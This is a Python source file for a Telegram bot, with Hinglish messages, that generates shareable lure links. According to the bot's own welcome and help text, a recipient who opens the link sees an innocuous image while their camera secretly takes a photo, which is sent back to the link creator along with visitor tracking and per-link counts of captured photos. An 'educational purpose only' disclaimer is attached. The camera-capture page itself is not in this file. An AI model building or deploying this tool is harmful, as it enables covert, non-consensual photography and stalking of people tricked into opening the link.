import os
import logging
import base64
from io import BytesIO
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters
)
from database import (
    create_link, 
    get_link, 
    get_user_links, 
    deactivate_link,
    add_visitor
)

# Logging setup
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation
WAITING_IMAGE = 1
WAITING_MESSAGE = 2

# Environment variables
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
WEBSITE_URL = os.environ.get("WEBSITE_URL", "https://your-app.onrender.com")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    keyboard = [
        [KeyboardButton("📸 Create Photo Link")],
        [KeyboardButton("📋 My Links"), KeyboardButton("ℹ️ Help")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    welcome_text = """
🎉 **Welcome to Photo Link Bot!**

Main kya karta hoon:
1️⃣ Tum mujhe ek image bhejo
2️⃣ Main ek unique link generate karunga
3️⃣ Tum wo link kisi ko share karo
4️⃣ Jab wo link khole, image dikhegi
5️⃣ Saath hi camera se photo capture hoga
6️⃣ Wo photo tumhe milegi!

⚠️ **Educational Purpose Only**

👇 Neeche buttons use karo:
    """
    
    await update.message.reply_text(
        welcome_text, 
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def create_photo_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Photo link creation start karo"""
    await update.message.reply_text(
        "📸 **Photo Link Banana Hai?**\n\n"
        "Mujhe wo image bhejo jo receiver ko dikhani hai.\n"
        "Image send karo 👇",
        parse_mode="Markdown"
    )
    return WAITING_IMAGE

async def receive_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User se image receive karo"""
    if update.message.photo:
        # Sabse badi photo lo
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        
        # Photo download karo
        photo_bytes = await file.download_as_bytearray()
        
        # Base64 encode karo (simple storage)
        photo_base64 = base64.b64encode(photo_bytes).decode('utf-8')
        
        # Context mein save karo
        context.user_data['pending_image'] = photo_base64
        context.user_data['file_id'] = photo.file_id
        
        await update.message.reply_text(
            "✅ Image received!\n\n"
            "Ab ek custom message likho jo page par dikhega\n"
            "(ya /skip likho agar message nahi chahiye):",
            parse_mode="Markdown"
        )
        return WAITING_MESSAGE
    else:
        await update.message.reply_text(
            "❌ Please ek image bhejo (photo format mein)."
        )
        return WAITING_IMAGE

async def receive_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Custom message receive karo aur link generate karo"""
    custom_message = update.message.text
    if custom_message == "/skip":
        custom_message = "Someone shared a photo with you! 📸"
    
    chat_id = update.message.chat_id
    image_data = context.user_data.get('pending_image', '')
    
    # Database mein link create karo
    link_id = create_link(
        chat_id=chat_id,
        image_url=image_data,  # Base64 image store
        custom_message=custom_message
    )
    
    # Full URL banao
    full_url = f"{WEBSITE_URL}/view/{link_id}"
    
    # Inline buttons
    keyboard = [
        [InlineKeyboardButton("🔗 Open Link", url=full_url)],
        [InlineKeyboardButton("📊 Link Stats", callback_data=f"stats_{link_id}")],
        [InlineKeyboardButton("🗑️ Delete Link", callback_data=f"delete_{link_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ **Link Successfully Created!**\n\n"
        f"🔗 **Your Link:**\n`{full_url}`\n\n"
        f"📝 **Message:** {custom_message}\n\n"
        f"📋 Link copy karke kisi ko bhi share karo!\n"
        f"Jab wo open karega, tujhe photo milegi 📸",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )
    
    # Cleanup
    context.user_data.pop('pending_image', None)
    context.user_data.pop('file_id', None)
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Conversation cancel karo"""
    await update.message.reply_text("❌ Cancelled. /start se dobara shuru karo.")
    context.user_data.clear()
    return ConversationHandler.END

async def my_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User ke saare links dikhao"""
    chat_id = update.message.chat_id
    links = get_user_links(chat_id)
    
    if not links:
        await update.message.reply_text(
            "📋 Tumhara koi link nahi hai.\n"
            "'📸 Create Photo Link' button dabao!"
        )
        return
    
    text = "📋 **Tumhare Links:**\n\n"
    for link_id, data in links.items():
        status = "✅ Active" if data["is_active"] else "❌ Inactive"
        text += (
            f"🔗 `{WEBSITE_URL}/view/{link_id}`\n"
            f"   Status: {status}\n"
            f"   Visitors: {len(data['visitors'])}\n"
            f"   Photos: {data['photos_received']}\n"
            f"   Created: {data['created_at'][:10]}\n\n"
        )
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help message"""
    help_text = """
ℹ️ **Help Guide**

**Commands:**
/start - Bot start karo
/create - Naya photo link banao
/mylinks - Apne links dekho
/help - Yeh message

**Kaise kaam karta hai:**
1. "Create Photo Link" dabao
2. Ek image bhejo
3. Custom message likho
4. Link share karo
5. Jab koi open kare, photo milegi

**Features:**
• Unique links generate
• Real-time photo capture
• Visitor tracking
• Link management

⚠️ Educational purpose only!
    """
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Inline button callbacks handle karo"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith("stats_"):
        link_id = data.replace("stats_", "")
        link_data = get_link(link_id)
        
        if link_data:
            await query.edit_message_text(
                f"📊 **Link Stats: {link_id}**\n\n"
                f"👁️ Total Visitors: {len(link_data['visitors'])}\n"
                f"📸 Photos Captured: {link_data['photos_received']}\n"
                f"📅 Created: {link_data['created_at'][:10]}\n"
                f"✅ Active: {'Yes' if link_data['is_active'] else 'No'}",
                parse_mode="Markdown"
            )
    
    elif data.startswith("delete_"):
        link_id = data.replace("delete_", "")
        if deactivate_link(link_id):
            await query.edit_message_text(
                f"🗑️ Link `{link_id}` deactivate ho gaya!",
                parse_mode="Markdown"
            )

async def handle_text_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reply keyboard buttons handle karo"""
    text = update.message.text
    
    if text == "📸 Create Photo Link":
        return await create_photo_link(update, context)
    elif text == "📋 My Links":
        await my_links(update, context)
    elif text == "ℹ️ Help":
        await help_command(update, context)

def setup_bot():
    """Bot setup karo aur application return karo"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for link creation
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("create", create_photo_link),
            MessageHandler(
                filters.Regex("^📸 Create Photo Link$"), 
                create_photo_link
            )
        ],
        states={
            WAITING_IMAGE: [
                MessageHandler(filters.PHOTO, receive_image)
            ],
            WAITING_MESSAGE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, 
                    receive_message
                ),
                CommandHandler("skip", receive_message)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    # Handlers add karo
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("mylinks", my_links))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(
        filters.Regex("^(📋 My Links|ℹ️ Help)$"), 
        handle_text_buttons
    ))
    
    return application

# Ye function server.py se call hoga
def get_bot_app():
    return setup_bot()
